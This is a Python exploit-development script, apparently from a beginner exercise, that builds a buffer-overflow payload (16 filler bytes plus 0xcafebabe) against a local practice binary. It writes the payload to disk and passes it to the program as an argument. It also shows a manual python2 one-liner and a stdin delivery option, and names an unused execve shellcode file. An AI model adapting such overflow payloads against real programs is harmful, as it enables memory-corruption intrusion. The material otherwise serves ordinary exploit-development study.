#!/usr/bin/python3
import sys
from subprocess import Popen, PIPE
import shlex
import struct

'''
Exploit Development on 
> x86-64 Arch => Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux
> ARM Arch => 

Triggering manual exploitation
$ ./001_overflow_example.elf $(python2 -c 'print "A"*16 + "\xbe\xba\xfe\xca"')

STACK DIAGRAM

        +------------+ 
        | buffer_two |
        +------------+
        | buffer_one |
        +------------+
        |    value   |
        +------------+

STACK state before ACID rain
STACK state after ACID rain
'''

target = "./001_overflow_example.elf"
shellcode = "./shellcode/execve_binsh.raw"

# CREATE payload
payload = bytearray()
payload += ("A"*16).encode('utf-8')
payload += struct.pack('<I', 0xcafebabe) 
print ("CREATED payload: ", end = '')
print (payload)

# WRITE payload to DISK (useful to trigger manual exploitation)
filename = 'malinput.' + target[:-4].replace("./", "") + "." + sys.argv[0].replace("./", '')[:11]
fo = open(filename, 'wb')
fo.write(payload)
fo.close()
print ("WROTE payload to disk: " + filename)

# -x-x-x-x- SEND payload to vulnerable process -x-x-x-x-

print ("SENDING payload to target process: " + target)
print ()

# Send payload via CMD Line arguments
p = Popen([target, bytes(payload)])

'''
# Send payload via ENVIRONMENT variable
'''

'''
# Send payload via STDIN
p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload)
p.stdin.flush()
'''
